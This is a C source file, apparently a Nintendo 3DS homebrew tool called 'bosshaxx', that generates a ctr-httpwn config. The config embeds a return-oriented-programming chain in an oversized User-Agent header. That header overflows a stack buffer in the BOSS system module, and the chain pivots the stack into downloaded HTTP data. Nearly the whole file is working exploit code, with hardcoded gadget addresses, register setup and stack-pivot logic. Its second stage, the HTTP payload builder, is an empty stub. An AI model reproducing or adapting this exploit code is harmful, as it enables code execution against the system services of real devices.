#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "types.h"

//Build with: gcc -o bosshaxx bosshaxx.c

FILE *fout = NULL;

char configxml_formatstr[] = {
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
<config>\n\
	<targeturl>\n\
		<name>bosshaxx</name>\n\
		<caps>AddRequestHeader</caps>\n\
		<url>%s</url>\n\
		<new_url>%s</new_url>\n\
\n\
		<requestoverride type=\"reqheader\">\n\
			<name>User-Agent</name>\n\
			<new_value format=\"hex\">%s</new_value>\n\
			<new_descriptorword_value>0xbcc</new_descriptorword_value>\n\
		</requestoverride>\n\
	</targeturl>\n\
</config>\n\
"};

u32 ROP_POPR4R5R67PC = 0x0012195f;

u32 ROP_STACKPIVOT = 0x00142a64;//Add sp with r3 then pop-pc. 

u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.

u32 ropvaddr_end = 0;

//From ctrtool.
void putle32(u8* p, u32 n)
{
	p[0] = n;
	p[1] = n>>8;
	p[2] = n>>16;
	p[3] = n>>24;
}

void ropgen_addword(u32 **ropchain, u32 *ropvaddr, u32 value)
{
	u32 *ptr = *ropchain;

	if(ropvaddr_end <= *ropvaddr)
	{
		printf("ROP-chain is too large.\n");
		exit(9);
	}

	putle32((u8*)ptr, value);

	(*ropchain)++;
	(*ropvaddr)+=4;
}

void ropgen_addwords(u32 **ropchain, u32 *ropvaddr, u32 *buf, u32 total_words)
{
	u32 *ptr = *ropchain;
	u32 pos;

	if(ropvaddr_end <= *ropvaddr || (ropvaddr_end < ((*ropvaddr) + total_words*4)))
	{
		printf("ROP-chain is too large.\n");
		exit(9);
	}

	if(buf)
	{
		for(pos=0; pos<total_words; pos++)putle32((u8*)&ptr[pos], buf[pos]);
	}
	else
	{
		memset(ptr, 0, total_words*4);
	}

	(*ropchain)+=total_words;
	(*ropvaddr)+= total_words*4;
}

void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7)//Total size: 0x14-bytes.
{
	ropgen_addword(ropchain, ropvaddr, ROP_POPR4R5R67PC);
	ropgen_addword(ropchain, ropvaddr, r4);
	ropgen_addword(ropchain, ropvaddr, r5);
	ropgen_addword(ropchain, ropvaddr, r6);
	ropgen_addword(ropchain, ropvaddr, r7);
}

void ropgen_stackpivot(u32 **ropchain, u32 *ropvaddr, u32 addr)//Total size: 0x8-bytes.
{
	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.

	ropgen_addword(ropchain, ropvaddr, ROP_STACKPIVOT_POPR3);
	ropgen_addword(ropchain, ropvaddr, addr - (*ropvaddr + 4));
}

void buildrop_config(u32 *ropchain, u32 ropchain_maxsize)
{
	u32 ropvaddr = 0x0803b7f8-0xa4;
	u32 ua[0x80>>2];

	u32 stack_contentbufsize_ptr = 0x803b874;
	u32 stack_recvdata_timeoutptr = 0x803b8b8;

	ropvaddr_end = ropvaddr+ropchain_maxsize;

	//This ropchain buffer starts with the user-agent. The UA has 0x80-bytes allocated on stack, with the saved registers immediately following that. The sysmodule v13314 function for this is LT_121350.

	memset(ua, 0, sizeof(ua));
	strncpy((char*)ua, "PBOS-8.0/0000000000000000-0000000000000000/00.0.0-00X/00000/0", sizeof(ua)-1);

	ropgen_addwords(&ropchain, &ropvaddr, ua, 0x80>>2);

	//r0-r3 are not popped from stack during return.
	ropgen_addword(&ropchain, &ropvaddr, 0);//r0
	ropgen_addword(&ropchain, &ropvaddr, 0);//r1
	ropgen_addword(&ropchain, &ropvaddr, 0);//r2
	ropgen_addword(&ropchain, &ropvaddr, contentdatabuf_addr);//r3, output content data addr for httpc_ReceiveDataTimeout.

	ropgen_addword(&ropchain, &ropvaddr, 0x34343434);//r4
	ropgen_addword(&ropchain, &ropvaddr, 0x35353535);//r5
	ropgen_addword(&ropchain, &ropvaddr, 0x36363636);//r6
	ropgen_addword(&ropchain, &ropvaddr, 0x37373737);//r7

	//pc for the initial reg-pop is here. The data starting at r4 below is also used by the target function as insp0, which has to be valid otherwise it won't download the content properly/crash.

	ropgen_popr4r5r6r7r8pc(&ropchain, &ropvaddr, 0x0, stack_contentbufsize_ptr, stack_recvdata_timeoutptr, 0x0);

	ropgen_stackpivot(&ropchain, &ropvaddr, contentdatabuf_addr);//Stack-pivot to the http content data downloaded by the targeted function.
}

void buildrop_http(u32 *ropchain, u32 ropchain_maxsize)
{
	u32 ropvaddr = contentdatabuf_addr;

	ropvaddr_end = ropvaddr+ropchain_maxsize;
}

int main(int argc, char **argv)
{
	int using_outpath = 0;
	int output_type = -1;
	int argi;
	u32 pos;

	u32 *ropchain = NULL;
	u8 *ropchain8 = NULL;
	char *configout = NULL;
	u32 configout_size = 0x400;
	u32 ropchain_maxsize = 0x1000;

	char *url = NULL, *new_url = NULL;
	char config_hexdata[0x200];

	fout = stdout;

	url = "https://nppl.c.app.nintendowifi.net/p01/policylist/";

	if(argc<3)
	{
		printf("bosshaxx by yellows8.\n");
		printf("Generate the ctr-httpwn config and http data for 3DS BOSS-sysmodule haxx.\n");
		printf("Usage:\n");
		printf("%s <config|http> <version> <options>\n", argv[0]);
		printf("Supported versions: 'v13314'.\n");
		printf("Options:\n");
		printf("--outpath=<filepath> Output path. If not specified stdout will be used instead.\n");
		printf("--url=<url> ctr-httpwn config <url> tag content. Default is the policylist url.\n");
		printf("--new_url=<url> ctr-httpwn config <new_url> tag content. Required with the config type.\n");
		return 1;
	}

	if(strcmp(argv[1], "config")==0)
	{
		output_type = 0;
	}
	else if(strcmp(argv[1], "http")==0)//Can be used with policylist or anything requested with HTTP GET.
	{
		output_type = 1;
	}
	else
	{
		printf("Invalid output_type: %s\n", argv[1]);
		return 2;
	}

	if(strcmp(argv[2], "v13314"))
	{
		printf("Invalid version: %s\n", argv[2]);
		return 3;
	}

	for(argi=3; argi<argc; argi++)
	{
		if(strncmp(argv[argi], "--outpath=", 10)==0)
		{
			fout = fopen(&argv[argi][10], "wb");
			if(fout==NULL)
			{
				printf("Failed to open output file: %s\n", &argv[argi][10]);
				return 4;
			}

			using_outpath = 1;
		}
		else if(strncmp(argv[argi], "--url=", 6)==0)
		{
			url = &argv[argi][6];
		}
		else if(strncmp(argv[argi], "--new_url=", 10)==0)
		{
			new_url = &argv[argi][10];
		}
	}

	if(output_type==0 && new_url==NULL)
	{
		printf("The new_url is required.\n");
		return 6;
	}

	if(output_type==0)
	{
		configout = malloc(configout_size);
		if(configout==NULL)
		{
			if(using_outpath)fclose(fout);
			printf("Failed to allocate memory for configout.\n");
			return 5;
		}
	}

	ropchain = malloc(ropchain_maxsize);
	ropchain8 = (u8*)ropchain;
	if(ropchain==NULL)
	{
		if(using_outpath)fclose(fout);
		if(output_type==0)free(configout);
		printf("Failed to allocate memory for ropchain.\n");
		return 5;
	}

	if(output_type==0)ropchain_maxsize = 0xbc;

	if(output_type==0)buildrop_config(ropchain, ropchain_maxsize);
	if(output_type==1)buildrop_http(ropchain, ropchain_maxsize);

	if(output_type==0)
	{
		memset(config_hexdata, 0, sizeof(config_hexdata));

		for(pos=0; pos<0xbc; pos++)sprintf(&config_hexdata[pos*2], "%02x", (unsigned int)ropchain8[pos]);

		snprintf(configout, configout_size-1, configxml_formatstr, url, new_url, config_hexdata);
		fprintf(fout, "%s", configout);
	}

	if(output_type==0)free(configout);
	free(ropchain);

	if(using_outpath)
	{
		fclose(fout);
	}
	else
	{
		fflush(fout);
	}

	return 0;
}

